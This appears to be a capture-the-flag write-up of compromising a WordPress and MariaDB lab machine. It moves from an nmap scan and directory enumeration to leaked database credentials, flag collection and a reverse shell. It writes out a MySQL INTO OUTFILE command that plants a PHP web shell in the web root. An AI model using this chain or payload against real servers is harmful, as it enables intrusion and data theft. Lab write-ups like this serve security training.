![[Pasted image 20240827192713.png]]

# Reconnaissance

Full nmap scan

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
| ssh-hostkey: 
|   2048 65:cc:32:50:bb:af:b4:8a:be:ff:b1:39:3c:dd:2c:e9 (RSA)
|   256 f9:db:6f:49:63:d7:db:dd:42:42:86:36:c5:31:b1:07 (ECDSA)
|_  256 8e:74:a9:e3:fd:74:0c:c2:f7:14:85:81:a6:ba:fc:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.12
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: e-corp &#8211; Just another WordPress site
|_http-server-header: Apache/2.4.25 (Debian)
3306/tcp open  mysql   MySQL 5.5.5-10.1.26-MariaDB-0+deb9u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.26-MariaDB-0+deb9u1
|   Thread ID: 16
|   Capabilities flags: 63487
|   Some Capabilities: Speaks41ProtocolNew, InteractiveClient, SupportsCompression, DontAllowDatabaseTableColumn, ConnectWithDatabase, FoundRows, IgnoreSigpipes, ODBCClient, LongPassword, Speaks41ProtocolOld, Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, SupportsTransactions, LongColumnFlag, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: gs.*),BH$uGBRU8S|66J
|_  Auth Plugin Name: mysql_native_password
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=8/27%OT=22%CT=1%CU=36936%PV=Y%DS=2%DC=T%G=Y%TM=66CD
OS:E7FF%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=I%TS=8)SEQ(S
OS:P=106%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW
OS:7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=7120%
OS:W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M508N
OS:NSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=
OS:Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=A
OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=4
OS:0%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.013 days (since Tue Aug 27 15:32:46 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   168.73 ms 10.66.66.1
2   174.43 ms 10.150.150.145

```



The nmap scan shows there's a webserver running on the target on port 80, navigating to it is a webpage that's powered by wordpress

![[Pasted image 20240827154646.png]]

![[Pasted image 20240827154713.png]]


So i used `wpscan` to enumerate the site since as it was built using wordpress, and i discovered and uploads directory

![[Pasted image 20240827155612.png]]

Navigating to the directory i found `FLAG22`

![[Pasted image 20240827155646.png]]

I also found a user `eadmin`

![[Pasted image 20240827160413.png]]

Which i tested the username on the login page to confirm its validity

![[Pasted image 20240827160809.png]]

Doing some directory bruteforce attack, using dirsearch to see if I could find any exposed sensitive files & folders i found a zip file `backup.zip`

![[Pasted image 20240827170209.png]]

Unziping the zip file i found `FLAG14`

![[Pasted image 20240827170446.png]]


I also found a  wordpress config file which usually contain database username and password, which i found in the file

![[Pasted image 20240827172444.png]]

![[Pasted image 20240827172522.png]]

Using the database username and password i was able to log in to the mysql mariadb database

![[Pasted image 20240827172703.png]]

Showing the available databases and listing the tables in the database `wordpress` i found `FLAG32`

![[Pasted image 20240827172909.png]]

Listing everything in the table `wp_users` i found user `eadmin` password hash

![[Pasted image 20240827173054.png]]

Using hashcat to crack the file was unsuccessful 

I used the following mysql mariadb command to create a php webshell to a new file on the webserver

```
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/cmd3.php';
```

![[Pasted image 20240827180527.png]]

Using the `ls` command i was able to list the contents of the directory where i found and interesting file `WordPress-Account.txt`

![[Pasted image 20240827180729.png]]

Cating out the contents of the `WordPress-Account.txt` i found user `eadmin` password 

![[Pasted image 20240827180829.png]]

I used the credentials to login into the wordpress dashboard and i found `FLAG23`

![[Pasted image 20240827181109.png]]

So to gain a shell i created a php reverse shell with python hosted it on my machine and used

![[Pasted image 20240827192310.png]]

![[Pasted image 20240827192326.png]]

Then i navigated to the file and got a reverse shell\

![[Pasted image 20240827192528.png]]

Navigating to the home directory i found a user directory `webmaster` changing to the directory i found the last flag `FLAG6`

![[Pasted image 20240827192940.png]]
